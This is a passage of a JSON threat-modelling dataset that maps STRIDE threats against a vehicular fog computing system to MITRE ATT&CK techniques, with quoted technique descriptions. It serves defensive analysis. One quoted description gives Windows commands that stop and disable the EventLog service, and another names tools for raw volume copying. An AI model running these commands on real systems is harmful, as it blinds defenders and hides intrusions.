            "Potential Impact": "Unauthorized access to sensitive data stored on fog nodes, leading to potential data breaches and misuse.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "access control",
                "fog node",
                "data breach",
                "unauthorized access"
            ],
            "mitre_technique": {
                "name": "File and Directory Permissions Modification",
                "description": "Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.(Citation: Hybrid Analysis Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 May 2018) File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).\n\nModifications may include changing specific access rights, which may require taking ownership of a file or directory and/or elevated permissions depending on the file or directory\u2019s existing permissions. This may enable malicious activity such as modifying, replacing, or deleting specific files or directories. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via [Accessibility Features](https://attack.mitre.org/techniques/T1546/008), [Boot or Logon Initialization Scripts](https://attack.mitre.org/techniques/T1037), [Unix Shell Configuration Modification](https://attack.mitre.org/techniques/T1546/004), or tainting/hijacking other instrumental binary/configuration files via [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574).\n\nAdversaries may also change permissions of symbolic links. For example, malware (particularly ransomware) may modify symbolic links and associated settings to enable access to files from local shortcuts with remote paths.(Citation: new_rust_based_ransomware)(Citation: bad_luck_blackcat)(Citation: falconoverwatch_blackcat_attack)(Citation: blackmatter_blackcat)(Citation: fsutil_behavior) ",
                "id": "attack-pattern--65917ae0-b854-4139-83fe-bf2441cf0196",
                "technique_id": "T1222"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Cloud services accidentally expose sensitive data due to misconfigurations.",
            "Assumptions": [
                {
                    "Assumption": "Cloud services are not properly configured to secure data.",
                    "Role": "Cloud Service",
                    "Condition": "When using default or weak security settings"
                },
                {
                    "Assumption": "Sensitive data is stored in cloud services.",
                    "Role": "Cloud Service",
                    "Condition": "When data management involves storage in the cloud"
                },
                {
                    "Assumption": "Access controls are not rigorously enforced.",
                    "Role": "Cloud Service",
                    "Condition": "When relying on inadequate access policies"
                }
            ],
            "Potential Impact": "Sensitive data could be unintentionally exposed, leading to unauthorized access and data leaks.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "cloud",
                "misconfiguration",
                "sensitive data",
                "data leak"
            ],
            "mitre_technique": {
                "name": "Data from Cloud Storage",
                "description": "Adversaries may access data from cloud storage.\n\nMany IaaS providers offer solutions for online data object storage such as Amazon S3, Azure Storage, and Google Cloud Storage. Similarly, SaaS enterprise platforms such as Office 365 and Google Workspace provide cloud-based document storage to users through services such as OneDrive and Google Drive, while SaaS application providers such as Slack, Confluence, Salesforce, and Dropbox may provide cloud storage solutions as a peripheral or primary use case of their platform. \n\nIn some cases, as with IaaS-based cloud storage, there exists no overarching application (such as SQL or Elasticsearch) with which to interact with the stored objects: instead, data from these solutions is retrieved directly though the [Cloud API](https://attack.mitre.org/techniques/T1059/009). In SaaS applications, adversaries may be able to collect this data directly from APIs or backend cloud storage objects, rather than through their front-end application or interface (i.e., [Data from Information Repositories](https://attack.mitre.org/techniques/T1213)). \n\nAdversaries may collect sensitive data from these cloud storage solutions. Providers typically offer security guides to help end users configure systems, though misconfigurations are a common problem.(Citation: Amazon S3 Security, 2019)(Citation: Microsoft Azure Storage Security, 2019)(Citation: Google Cloud Storage Best Practices, 2019) There have been numerous incidents where cloud storage has been improperly secured, typically by unintentionally allowing public access to unauthenticated users, overly-broad access by all users, or even access for any anonymous person outside the control of the Identity Access Management system without even needing basic user permissions.\n\nThis open access may expose various types of sensitive data, such as credit cards, personally identifiable information, or medical records.(Citation: Trend Micro S3 Exposed PII, 2017)(Citation: Wired Magecart S3 Buckets, 2019)(Citation: HIPAA Journal S3 Breach, 2017)(Citation: Rclone-mega-extortion_05_2021)\n\nAdversaries may also obtain then abuse leaked credentials from source repositories, logs, or other means as a way to gain access to cloud storage objects.",
                "id": "attack-pattern--3298ce88-1628-43b1-87d9-0b5336b193d7",
                "technique_id": "T1530"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Distributed Denial of Service (DDoS) attack targets fog nodes, overwhelming them with traffic.",
            "Assumptions": [
                {
                    "Assumption": "Fog nodes are exposed to the public internet.",
                    "Role": "Fog Node",
                    "Condition": "When fog nodes are accessible over the internet"
                },
                {
                    "Assumption": "Adequate DDoS protection mechanisms are not in place.",
                    "Role": "Fog Node",
                    "Condition": "When lacking network-level defenses"
                },
                {
                    "Assumption": "Attacker can coordinate a large volume of traffic to target.",
                    "Role": "Attacker",
                    "Condition": "When leveraging botnets or similar resources"
                }
            ],
            "Potential Impact": "Disruption to real-time traffic management and vehicle communication leading to potential safety hazards.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "DDoS",
                "fog node",
                "traffic influx",
                "unavailability"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Malicious software on fog nodes causes service interruptions.",
            "Assumptions": [
                {
                    "Assumption": "Fog nodes lack robust malware detection and prevention.",
                    "Role": "Fog Node",
                    "Condition": "When lacking endpoint protection solutions"
                },
                {
                    "Assumption": "Attacker successfully infiltrates fog node systems.",
                    "Role": "Attacker",
                    "Condition": "When leveraging malware or exploiting vulnerabilities"
                },
                {
                    "Assumption": "Essential services on fog nodes are susceptible to disruption.",
                    "Role": "Fog Node",
                    "Condition": "When critical services are not isolated"
                }
            ],
            "Potential Impact": "Interruption of fog node operations, affecting local data processing and traffic management.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "malware",
                "fog node",
                "service disruption",
                "endpoint protection"
            ],
            "mitre_technique": {
                "name": "OS Exhaustion Flood",
                "description": "Adversaries may launch a denial of service (DoS) attack targeting an endpoint's operating system (OS). A system's OS is responsible for managing the finite resources as well as preventing the entire system from being overwhelmed by excessive demands on its capacity. These attacks do not need to exhaust the actual resources on a system; the attacks may simply exhaust the limits and available resources that an OS self-imposes.\n\nDifferent ways to achieve this exist, including TCP state-exhaustion attacks such as SYN floods and ACK floods.(Citation: Arbor AnnualDoSreport Jan 2018) With SYN floods, excessive amounts of SYN packets are sent, but the 3-way TCP handshake is never completed. Because each OS has a maximum number of concurrent TCP connections that it will allow, this can quickly exhaust the ability of the system to receive new requests for TCP connections, thus preventing access to any TCP service provided by the server.(Citation: Cloudflare SynFlood)\n\nACK floods leverage the stateful nature of the TCP protocol. A flood of ACK packets are sent to the target. This forces the OS to search its state table for a related TCP connection that has already been established. Because the ACK packets are for connections that do not exist, the OS will have to search the entire state table to confirm that no match exists. When it is necessary to do this for a large flood of packets, the computational requirements can cause the server to become sluggish and/or unresponsive, due to the work it must do to eliminate the rogue ACK packets. This greatly reduces the resources available for providing the targeted service.(Citation: Corero SYN-ACKflood)",
                "id": "attack-pattern--0df05477-c572-4ed6-88a9-47c581f548f7",
                "technique_id": "T1499.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Flooding attacks on cloud services, disrupting data processing from fog nodes.",
            "Assumptions": [
                {
                    "Assumption": "Cloud services are not adequately protected against volumetric attacks.",
                    "Role": "Cloud Service",
                    "Condition": "When lacking DDoS mitigation strategies"
                },
                {
                    "Assumption": "Attackers can generate significant artificial traffic towards cloud endpoints.",
                    "Role": "Attacker",
                    "Condition": "When exploiting cloud service vulnerabilities"
                },
                {
                    "Assumption": "Fog nodes rely on constant cloud connectivity.",
                    "Role": "Fog Node",
                    "Condition": "When requiring uninterrupted cloud interaction"
                }
            ],
            "Potential Impact": "Disruption in data processing and long-term storage capabilities, leading to delays and data loss.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "cloud",
                "flooding",
                "volumetric attack",
                "service disruption"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a vulnerability in the fog node software to gain administrator access.",
            "Assumptions": [
                {
                    "Assumption": "Fog node software contains exploitable vulnerabilities.",
                    "Role": "Fog Node",
                    "Condition": "When software is outdated or insufficiently secured"
                },
                {
                    "Assumption": "Attacker has knowledge of the specific vulnerability.",
                    "Role": "Attacker",
                    "Condition": "When leveraging publicly known exploits"
                },
                {
                    "Assumption": "Fog nodes do not have layered security defenses.",
                    "Role": "Fog Node",
                    "Condition": "When lacking multi-factor authentication and other controls"
                }
            ],
            "Potential Impact": "Potential control over fog node operations, leading to data manipulation or extended attacks on the VFC system.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "exploit",
                "vulnerability",
                "fog node",
                "administrator access"
            ],
            "mitre_technique": {
                "name": "Exploit Public-Facing Application",
                "description": "Adversaries may attempt to exploit a weakness in an Internet-facing host or system to initially access a network. The weakness in the system can be a software bug, a temporary glitch, or a misconfiguration.\n\nExploited applications are often websites/web servers, but can also include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other system with Internet accessible open sockets.(Citation: NVD CVE-2016-6662)(Citation: CIS Multiple SMB Vulnerabilities)(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)(Citation: Cisco Blog Legacy Device Attacks)(Citation: NVD CVE-2014-7169) Depending on the flaw being exploited this may also involve [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211) or [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203).\n\nIf an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs, exploit container host access via [Escape to Host](https://attack.mitre.org/techniques/T1611), or take advantage of weak identity and access management policies.\n\nAdversaries may also exploit edge network infrastructure and related appliances, specifically targeting devices that do not support robust host-based defenses.(Citation: Mandiant Fortinet Zero Day)(Citation: Wired Russia Cyberwar)\n\nFor websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities.(Citation: OWASP Top 10)(Citation: CWE top 25)",
                "id": "attack-pattern--3f886f2a-874f-4333-b794-aa6075009b1c",
                "technique_id": "T1190"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Malicious insider reconfigures fog nodes to gain unauthorized access to higher system functions.",
            "Assumptions": [
                {
                    "Assumption": "Access control policies for fog nodes are insufficient.",
                    "Role": "Fog Node",
                    "Condition": "When lacking role-based access control and monitoring"
                },
                {
                    "Assumption": "Insider has legitimate but limited access to fog nodes.",
                    "Role": "Insider",
                    "Condition": "When employees or contractors have system access"
                },
                {
                    "Assumption": "Motivated insider with intent to exploit system for personal gain.",
                    "Role": "Insider",
                    "Condition": "When leveraging position to escalate privileges"
                }
            ],
            "Potential Impact": "Complete control over fog node operations and unauthorized access to sensitive data.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "insider threat",
                "access control",
                "fog node",
                "unauthorized access"
            ],
            "mitre_technique": {
                "name": "Direct Volume Access",
                "description": "Adversaries may directly access a volume to bypass file access controls and file system monitoring. Windows allows programs to have direct access to logical volumes. Programs with direct access may read and write files directly from the drive by analyzing file system data structures. This technique may bypass Windows file access controls as well as file system monitoring tools. (Citation: Hakobyan 2009)\n\nUtilities, such as `NinjaCopy`, exist to perform these actions in PowerShell.(Citation: Github PowerSploit Ninjacopy) Adversaries may also use built-in or third-party utilities (such as `vssadmin`, `wbadmin`, and [esentutl](https://attack.mitre.org/software/S0404)) to create shadow copies or backups of data from system volumes.(Citation: LOLBAS Esentutl)",
                "id": "attack-pattern--0c8ab3eb-df48-4b9c-ace7-beacaac81cc5",
                "technique_id": "T1006"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker leverages weak authentication mechanisms to gain elevated access levels in the cloud service.",
            "Assumptions": [
                {
                    "Assumption": "Authentication mechanisms for cloud services are improperly configured or weak.",
                    "Role": "Cloud Service",
                    "Condition": "When using inadequate security protocols"
                },
                {
                    "Assumption": "Attacker has initial access to cloud services.",
                    "Role": "Attacker",
                    "Condition": "When leveraging compromised credentials or access tokens"
                },
                {
                    "Assumption": "Cloud services do not employ multi-factor authentication (MFA).",
                    "Role": "Cloud Service",
                    "Condition": "When relying on single-factor authentication"
                }
            ],
            "Potential Impact": "Elevation of privileges could lead to unauthorized data access, tampering, and extensive control over cloud resources.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "authentication",
                "cloud",
                "credentials",
                "MFA"
            ],
            "mitre_technique": {
                "name": "External Remote Services",
                "description": "Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006) and [VNC](https://attack.mitre.org/techniques/T1021/005) can also be used externally.(Citation: MacOS VNC software for Remote Desktop)\n\nAccess to [Valid Accounts](https://attack.mitre.org/techniques/T1078) to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network.(Citation: Volexity Virtual Private Keylogging) Access to remote services may be used as a redundant or persistent access mechanism during an operation.\n\nAccess may also be gained through an exposed service that doesn\u2019t require authentication. In containerized environments, this may include an exposed Docker API, Kubernetes API server, kubelet, or web application such as the Kubernetes dashboard.(Citation: Trend Micro Exposed Docker Server)(Citation: Unit 42 Hildegard Malware)",
                "id": "attack-pattern--10d51417-ee35-4589-b1ff-b6df1c334e8d",
                "technique_id": "T1133"
            }
        }
    ]
},
{
    "case_number": "11",
    "batch_number": "2",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker could spoof a legitimate fog node, intercepting and manipulating data between smart vehicles and fog nodes.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has physical or remote access to a fog node installation site.",
                    "Role": "Attacker",
                    "Condition": "Physical or proximity access to fog node is possible."
                },
                {
                    "Assumption": "There is an absence of robust authentication mechanisms between smart vehicles and fog nodes.",
                    "Role": "System administrator",
                    "Condition": "Weak or no authentication protocols in place."
                },
                {
                    "Assumption": "Attackers possess knowledge of communication protocols used by smart vehicles and fog nodes.",
                    "Role": "Attacker",
                    "Condition": "Attacker has sufficient technical expertise."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive vehicle and road condition data, data corruption, and disruption of vehicle-fog communication.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "man-in-the-middle",
                "network",
                "device"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker could impersonate a legitimate smart vehicle to a fog node to receive unauthorized services or send misleading information.",
            "Assumptions": [
                {
                    "Assumption": "Lack of mutual authentication between smart vehicles and fog nodes.",
                    "Role": "System administrator",
                    "Condition": "No or weak authentication protocols for smart vehicle-fog node communication."
                },
                {
                    "Assumption": "Smart vehicles' identifiers can be easily cloned or replicated.",
                    "Role": "Attacker",
                    "Condition": "Identification schemes are unprotected or poorly implemented."
                },
                {
                    "Assumption": "Attacker has access to the communication range of a fog node.",
                    "Role": "Attacker",
                    "Condition": "Physical or proximity access to fog node communication range."
                }
            ],
            "Potential Impact": "Misleading information could disrupt traffic management systems and compromise data integrity.",
            "MITRE ATT&CK Keywords": [
                "impersonation",
                "spoofing",
                "smart vehicle",
                "network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker could spoof cloud services to fog nodes, leading to the transmission of compromised or malicious updates.",
            "Assumptions": [
                {
                    "Assumption": "Fog nodes do not verify the integrity and authenticity of updates from cloud services.",
                    "Role": "System administrator",
                    "Condition": "Weak verification mechanisms between fog nodes and cloud services."
                },
                {
                    "Assumption": "Attackers can mimic the communication patterns of cloud services.",
                    "Role": "Attacker",
                    "Condition": "Attacker has sufficient knowledge of cloud service protocols."
                },
                {
                    "Assumption": "Fog nodes are configured to automatically accept updates from cloud sources.",
                    "Role": "System administrator",
                    "Condition": "Automatic, unverified update mechanisms."
                }
            ],
            "Potential Impact": "Deployment of malicious updates can lead to system vulnerabilities, data tampering, and system manipulation.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "update",
                "cloud service",
                "fog node"
            ],
            "mitre_technique": {
                "name": "Supply Chain Compromise",
                "description": "Adversaries may manipulate products or product delivery mechanisms prior to receipt by a final consumer for the purpose of data or system compromise.\n\nSupply chain compromise can take place at any stage of the supply chain including:\n\n* Manipulation of development tools\n* Manipulation of a development environment\n* Manipulation of source code repositories (public or private)\n* Manipulation of source code in open-source dependencies\n* Manipulation of software update/distribution mechanisms\n* Compromised/infected system images (multiple cases of removable media infected at the factory)(Citation: IBM Storwize)(Citation: Schneider Electric USB Malware) \n* Replacement of legitimate software with modified versions\n* Sales of modified/counterfeit products to legitimate distributors\n* Shipment interdiction\n\nWhile supply chain compromise can impact any component of hardware or software, adversaries looking to gain execution have often focused on malicious additions to legitimate software in software distribution or update channels.(Citation: Avast CCleaner3 2018)(Citation: Microsoft Dofoil 2018)(Citation: Command Five SK 2011) Targeting may be specific to a desired victim set or malicious software may be distributed to a broad set of consumers but only move on to additional tactics on specific victims.(Citation: Symantec Elderwood Sept 2012)(Citation: Avast CCleaner3 2018)(Citation: Command Five SK 2011) Popular open source projects that are used as dependencies in many applications may also be targeted as a means to add malicious code to users of the dependency.(Citation: Trendmicro NPM Compromise)",
                "id": "attack-pattern--3f18edba-28f4-4bb9-82c3-8aa60dcac5f7",
                "technique_id": "T1195"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker could tamper with the data logs within a fog node to manipulate traffic flow decisions.",
            "Assumptions": [
                {
                    "Assumption": "Fog nodes store local logs without encryption.",
                    "Role": "System administrator",
                    "Condition": "Data at rest is not encrypted or protected."
                },
                {
                    "Assumption": "Access controls to fog node data stores are weak or misconfigured.",
                    "Role": "System administrator",
                    "Condition": "Weak access control policies are in place."
                },
                {
                    "Assumption": "The attacker has physical or remote access to the fog node data store.",
                    "Role": "Attacker",
                    "Condition": "Access to fog node is feasible."
                }
            ],
            "Potential Impact": "Data integrity is compromised, leading to false alerts or decisions that disrupt traffic management.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "data integrity",
                "fog node",
                "traffic management"
            ],
            "mitre_technique": {
                "name": "Rootkit",
                "description": "Adversaries may deploy rootkits to hide the presence of programs, files, network connections, services, drivers, and other system components. Rootkits are programs that hide the existence of malware by intercepting and modifying operating-system API calls that supply system information. Rootkits or rootkit-enabling functionality may reside at the user or kernel level in the operating system, or lower. (Citation: Enterprise ATT&CK January 2018)   \n\nFirmware rootkits that affect the operating system yield nearly full control of the system. While firmware rootkits are normally developed for the main processing board, they can also be developed for the I/O that is attached to an asset. Compromise of this firmware allows the modification of all of the process variables and functions the module engages in. This may result in commands being disregarded and false information being fed to the main device. By tampering with device processes, an adversary may inhibit its expected response functions and possibly enable [Impact](https://attack.mitre.org/tactics/TA0105).",
                "id": "attack-pattern--3b6b9246-43f8-4c69-ad7a-2b11cfe0a0d9",
                "technique_id": "T0851"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker could tamper with firmware on fog nodes to install backdoors or other malicious software.",
            "Assumptions": [
                {
                    "Assumption": "Firmware updates lack integrity checks and digital signatures.",
                    "Role": "System administrator",
                    "Condition": "Firmware updates are not verified for authenticity."
                },
                {
                    "Assumption": "Attackers have tools and knowledge to modify firmware images.",
                    "Role": "Attacker",
                    "Condition": "Sufficient skillset and access to firmware development tools."
                },
                {
                    "Assumption": "Firmware update mechanisms are not securely implemented.",
                    "Role": "System administrator",
                    "Condition": "HTTP or unsecured update protocols are used."
                }
            ],
            "Potential Impact": "Compromised firmware can lead to persistent vulnerabilities, unauthorized access, and control over fog nodes.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "firmware",
                "backdoor",
                "fog node"
            ],
            "mitre_technique": {
                "name": "Component Firmware",
                "description": "Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS. This technique may be similar to [System Firmware](https://attack.mitre.org/techniques/T1019) but conducted upon other system components that may not have the same capability or level of integrity checking. Malicious device firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re-images, as well as a way to evade host software-based defenses and integrity checks.",
                "id": "attack-pattern--10d5f3b7-6be6-4da5-9a77-0f1e2bbfcc44",
                "technique_id": "T1109"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker could tamper with data transmitted between smart vehicles and fog nodes to cause incorrect vehicle behavior or decision-making.",
            "Assumptions": [
                {
                    "Assumption": "Data in transit between smart vehicles and fog nodes is not encrypted.",
                    "Role": "System administrator",
                    "Condition": "Lack of encryption or weak encryption protocols in place."
                },
                {
                    "Assumption": "The attacker can intercept and manipulate communications.",
                    "Role": "Attacker",
                    "Condition": "Proximity or network interception capabilities."
                },
                {
                    "Assumption": "Real-time data integrity checks are not performed.",
                    "Role": "System administrator",
                    "Condition": "No or inadequate real-time integrity monitoring."
                }
            ],
            "Potential Impact": "Data tampering could lead to unsafe driving decisions and traffic management disruptions.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "data manipulation",
                "network communication",
                "smart vehicle"
            ],
            "mitre_technique": {
                "name": "Transmitted Data Manipulation",
                "description": "Adversaries may alter data en route to storage or other systems in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating transmitted data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nManipulation may be possible over a network connection or between system processes where there is an opportunity deploy a tool that will intercept and change information. The type of modification and the impact it will have depends on the target transmission mechanism as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--cc1e737c-236c-4e3b-83ba-32039a626ef8",
                "technique_id": "T1493"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker could deny sending malicious instructions to a fog node, disrupting traffic management.",
            "Assumptions": [
                {
                    "Assumption": "Communication logs are not maintained with non-repudiation in mind.",
                    "Role": "System administrator",
                    "Condition": "Lack of comprehensive logging mechanisms."
                },
                {
                    "Assumption": "Weak or no digital signatures on command messages.",
                    "Role": "System administrator",
                    "Condition": "Messages are plaintext or weakly signed."
                },
                {
                    "Assumption": "Fog node relies on communication inputs without verification.",
                    "Role": "System administrator",
                    "Condition": "Blind trust in input data from vehicles or other nodes."
                }
            ],
            "Potential Impact": "Attackers evade attribution, reducing accountability and complicating incident response.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "logging",
                "digital signature",
                "traffic management"
            ],
            "mitre_technique": {
                "name": "Disable Windows Event Logging",
                "description": "Adversaries may disable Windows event logging to limit data that can be leveraged for detections and audits. Windows event logs record user and system activity such as login attempts, process creation, and much more.(Citation: Windows Log Events) This data is used by security tools and analysts to generate detections.\n\nThe EventLog service maintains event logs from various system components and applications.(Citation: EventLog_Core_Technologies) By default, the service automatically starts when a system powers on. An audit policy, maintained by the Local Security Policy (secpol.msc), defines which system events the EventLog service logs. Security audit policy settings can be changed by running secpol.msc, then navigating to <code>Security Settings\\Local Policies\\Audit Policy</code> for basic audit policy settings or <code>Security Settings\\Advanced Audit Policy Configuration</code> for advanced audit policy settings.(Citation: Audit_Policy_Microsoft)(Citation: Advanced_sec_audit_policy_settings) <code>auditpol.exe</code> may also be used to set audit policies.(Citation: auditpol)\n\nAdversaries may target system-wide logging or just that of a particular application. For example, the Windows EventLog service may be disabled using the <code>Set-Service -Name EventLog -Status Stopped</code> or <code>sc config eventlog start=disabled</code> commands (followed by manually stopping the service using <code>Stop-Service  -Name EventLog</code>).(Citation: Disable_Win_Event_Logging)(Citation: disable_win_evt_logging) Additionally, the service may be disabled by modifying the \u201cStart\u201d value in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EventLog</code> then restarting the system for the change to take effect.(Citation: disable_win_evt_logging)\n\nThere are several ways to disable the EventLog service via registry key modification. First, without Administrator privileges, adversaries may modify the \"Start\" value 